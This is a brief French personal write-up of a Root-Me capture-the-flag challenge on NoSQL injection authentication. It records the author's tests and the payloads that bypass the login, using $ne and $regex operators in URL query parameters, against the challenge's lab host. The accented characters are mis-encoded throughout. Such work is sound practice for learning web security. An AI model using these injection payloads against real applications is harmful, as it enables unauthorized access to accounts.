---
categorie: ???
tags:
  - rootme
  - "#informatique/cyber"
lien: https://www.root-me.org/fr/Challenges/Web-Serveur/NoSQL-injection-Authentification
---
# But

trouver le nom de l'utilisateur cachÃ©

# Fourni

# MÃ©thode de rÃ©solution


http://challenge01.root-me.org/web-serveur/ch38/?login[$ne]=toto&pass[$ne]=toto# 


je suis allÃ© sur hacktricks pour voir comment fonctionne une injection no sql

j'ai pu fazire quelques tests, et me connecter ne admin avec cette commande : 

http://challenge01.root-me.org/web-serveur/ch38/?login[$ne]=toto&pass[$ne]=toto

je crois que je peux me connecter en tant que login not equal toto 
mais je ne suis pas sur de savoir pourquoi admin
# Solution

login[$ne]=toto&pass[$regex]=a.{2}



